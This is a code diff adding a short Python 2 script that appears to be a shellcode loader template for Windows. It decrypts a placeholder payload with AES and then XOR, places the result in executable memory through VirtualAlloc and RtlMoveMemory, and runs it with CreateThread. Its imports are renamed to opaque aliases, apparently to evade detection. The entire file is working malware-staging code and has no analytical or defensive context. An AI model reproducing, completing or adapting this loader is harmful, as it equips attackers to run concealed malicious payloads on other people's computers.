@@ -1,0 +1,32 @@
+from ctypes import c_int as VAR1
+import ctypes as VAR25
+from ctypes import pointer as VAR5
+from ctypes import c_char as VAR6
+import hashlib as VAR2
+from Crypto.Cipher import AES as VAR3
+from base64 import b64decode as VAR7
+from binascii import unhexlify as VAR8
+from itertools import cycle as VAR9
+from itertools import izip as VAR10
+VAR4 = lambda s, p: s[0:-ord(s[-1])]
+VAR11 = '---CIPHER---'
+def XOR_decrypt(ciphertext, key):
+    return ''.join(chr(ord(x) ^ ord(y)) for (x, y) in VAR10(list(VAR7(ciphertext)), VAR9(key)))
+class AESDecryptor:
+    def __init__(self, key):
+        self.key = VAR2.sha256(key.encode('utf8')).digest()
+        self.bs = VAR3.block_size
+    def decrypt(self, ciphertext):
+        iv = VAR7(ciphertext)
+        cipher = VAR3.new(self.key, VAR3.MODE_CBC, iv[:VAR3.block_size])
+        return VAR4(cipher.decrypt(iv[VAR3.block_size:]), VAR3.block_size)
+PAYLOAD = '---PAYLOAD---'
+XORKEY = '---XORKEY---'
+aes_decryptor = AESDecryptor(VAR11)
+decrypted_payload = XOR_decrypt(aes_decryptor.decrypt(PAYLOAD), XORKEY)
+shellcode = bytearray(VAR8(decrypted_payload[::-1]))
+ptr = VAR25.windll.kernel32.VirtualAlloc(VAR1(0), VAR1(len(shellcode)), VAR1(0x3000), VAR1(0x40))
+buffer = (VAR6 * len(shellcode)).from_buffer(shellcode)
+VAR25.windll.kernel32.RtlMoveMemory(VAR1(ptr), buffer, VAR1(len(shellcode)))
+thread = VAR25.windll.kernel32.CreateThread(VAR1(0), VAR1(0), VAR1(ptr), VAR1(0), VAR1(0), VAR5(VAR1(0)))
+VAR25.windll.kernel32.WaitForSingleObject(VAR1(thread), VAR1(-1))
